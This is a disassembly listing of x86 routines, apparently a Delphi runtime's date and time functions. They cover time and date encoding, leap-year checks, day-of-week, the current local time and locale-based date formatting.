test dl dl
je r-xdata
test dl dl
je r-xdata
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
ja r-xdata
mov eax edx
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
xor edx edx
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
sub_4373c0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_449db8
mov edx esp
xor ecx ecx
call sub_437234
mov edx eax
test dl dl
je r-xdata
test dl dl
je r-xdata
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
ja r-xdata
mov eax edx
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
xor edx edx
fld [ esp ]
fld [ r-xdata ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
sub_43744c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_437490
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_437500
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_437490
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_434b74
sub_437540
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_43744c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_434b58
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_434b58
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_434b58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43759c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4375d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
movzx eax [ ebp - 0x2 ]
call sub_43759c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
movzx eax [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4376a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4375d8
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_434b74
sub_4376d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_43744c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_434b58
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_434b58
movzx eax [ ebp - 0x10 ]
add eax eax
add eax eax
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_434b58
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_43759c
mov edx eax
movzx eax dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
movzx eax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
movzx ecx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
movzx ecx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
movzx ecx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_437820
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4376d4
pop esi
pop ecx
pop ebp
retn 0x8
sub_437840
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_43744c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_437868
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx ecx [ esp + 0xe ]
movzx edx [ esp + 0xa ]
movzx eax [ esp + 0x8 ]
call sub_4376a4
fstp [ esp + 0x18 ]
fwait
movzx eax [ esp + 0x16 ]
push eax
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
movzx eax [ esp + 0x14 ]
call sub_437500
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_4378cc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x204 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x204 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x204 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx * 2 - 0x200 ]
mov ecx ebx
add ecx ecx
call sub_4476cc
sub_437910
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_437978
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4378cc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43797f
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_437984
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x20 ]
mov edx 0x10
call sub_43649c
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_4378cc
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4379d0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
movzx ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cx [ ebx - 0x16 ]
je r-xdata
add [ eax ] 0x2
mov eax [ eax ]
sub eax edx
sar eax 0x1
jns r-xdata
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
pop ebx
pop ebp
retn
adc eax 0x0
sub_437a04
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffe
call sub_437820
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_437a3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1e ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0xa ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_437540
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1e ] 0x1
sub_437a7c
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_437be4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_449d2c
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2 ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x6 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
push 0x100
lea eax [ ebp - 0x214 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437beb
lea eax [ ebp - 0x21c ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_449f14
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x218 ] eax
mov esi [ ebp - 0x218 ]
test esi esi
je r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_43aec0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_44a368
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_43aab8
cmp eax 0x4
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebx ]
mov edx 0x3
call sub_43ada8
mov esi eax
add esi esi
lea eax [ ebp - 0x214 ]
add esi eax
sub esi 0x2
lea eax [ ebp - 0x21c ]
mov edx esi
call sub_449ed8
mov eax [ ebp - 0x21c ]
mov edx 0x2
call sub_43aec0
mov ecx eax
mov eax ebx
mov edx esi
call sub_449e68
sub_437c08
push ebp
mov ebp esp
add esp 0xfffffde8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_437cf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_449d2c
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2 ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x6 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d00
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_449f14
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x214 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatW
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x218 ] eax
mov esi [ ebp - 0x218 ]
test esi esi
je r-xdata
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_44a368
sub esi 0x4
mov esi [ esi ]
sub_437d34
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4384e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4384e8
lea eax [ ebp - 0x2c ]
mov edx 0x2
call j_sub_44936c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x208 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x208 ]
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
mov [ ebp - 0x21 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx edi [ eax ]
test di di
jne r-xdata
mov [ ebp - 0x16 ] di
cmp [ ebp - 0x16 ] 0xd800
jb r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x208 ]
mov eax [ ebp - 0x14 ]
call sub_43aef8
mov [ ebp - 0x14 ] eax
movzx ebx [ ebp - 0x16 ]
mov eax ebx
add eax 0xffffff9f
sub ax 0x1a
jae r-xdata
cmp [ ebp - 0x16 ] 0xdfff
ja r-xdata
mov eax ebx
add eax 0xffffffbf
sub ax 0x1a
jae r-xdata
sub bx 0x20
mov eax [ ebp - 0x14 ]
call sub_43aef8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x20 ] 0x20
jmp r-xdata
movzx eax bx
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp bx 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x16 ]
mov edx 0x1
call sub_4378cc
pop ecx
movzx eax [ eax + lookup_table_437e15 ]
jmp [ eax * 4 + jump_table_437e4e ]
mov [ ebp - 0x20 ] bx
cmp [ ebp - 0x20 ] 0x48
jne r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a04
pop ecx
cmp [ ebp - 0x1c ] 0x2
jg r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_437a7c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_437910
pop ecx
jmp r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
call sub_437c08
pop ecx
mov eax [ ebp - 0x2c ]
call sub_437910
pop ecx
jmp r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a04
pop ecx
mov eax [ ebp - 0x1c ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4379d0
pop ecx
mov eax [ ebp - 0x1c ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a3c
pop ecx
mov [ ebp - 0x22 ] 0x0
mov esi [ ebp - 0x14 ]
jmp r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a3c
pop ecx
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a3c
pop ecx
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
push ebp
call sub_4379d0
pop ecx
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
push ebp
call sub_4379d0
pop ecx
push ebp
call sub_437a3c
pop ecx
cmp [ ebp - 0x1c ] 0x3
jle r-xdata
push ebp
call sub_437a3c
pop ecx
mov esi [ ebp - 0x14 ]
sub esi 0x2
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
push ebp
call sub_4379d0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
push ebp
call sub_437a3c
pop ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov bx 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
mov edx 0x4
call sub_437984
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_437984
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_437a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x6 ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xc ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4378cc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
jmp r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4378cc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4378cc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_437840
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
jmp r-xdata
dec eax
je r-xdata
cmp [ esi ] 0xd800
jb r-xdata
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] ax
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4378cc
pop ecx
add [ ebp - 0x14 ] 0x8
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
add esi 0x6
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x14 ]
sub edx esi
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x16 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_437840
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
cmp eax 0x48
jg r-xdata
cmp [ esi ] 0xdfff
ja r-xdata
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4378cc
pop ecx
add [ ebp - 0x14 ] 0x4
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
add esi 0x4
mov eax esi
call sub_4378cc
pop ecx
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
je r-xdata
adc edx 0x0
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0xd800
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov eax esi
call sub_43aef8
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
call sub_437984
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
cmp [ ebp - 0x24 ] 0xc
jbe r-xdata
mov [ ebp - 0x24 ] 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
push ebp
call sub_437a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_437840
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
add [ ebp - 0x14 ] 0x6
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437910
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437910
pop ecx
jmp r-xdata
add [ ebp - 0x14 ] 0x2
jmp r-xdata
add [ ebp - 0x14 ] 0x2
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0xdfff
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_437d34
pop ecx
jmp r-xdata
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub [ ebp - 0x24 ] 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x16 ]
mov edx 0x1
call sub_4378cc
pop ecx
jmp r-xdata
push ebp
call sub_437a04
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_437840
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_437910
pop ecx
add [ ebp - 0x14 ] 0x4
jmp r-xdata
add [ ebp - 0x14 ] 0x6
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_43aef8
mov [ ebp - 0x14 ] eax
jmp r-xdata
add esi 0x2
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_43626c
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x22 ]
xor al 0x1
mov [ ebp - 0x22 ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_43626c
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_43626c
test eax eax
jne r-xdata
jmp r-xdata
sub_438528
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x204 ] eax
xor eax eax
mov [ ebp - 0x208 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_437d34
pop ecx
push ebp
mov eax ebx
call sub_437d34
pop ecx
jmp r-xdata
lea edx [ ebp - 0x200 ]
mov eax esi
mov ecx [ ebp - 0x204 ]
call sub_449e68
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_438598
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4385f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
cmp ebx eax
jg r-xdata
mov [ esi ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4385fe
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
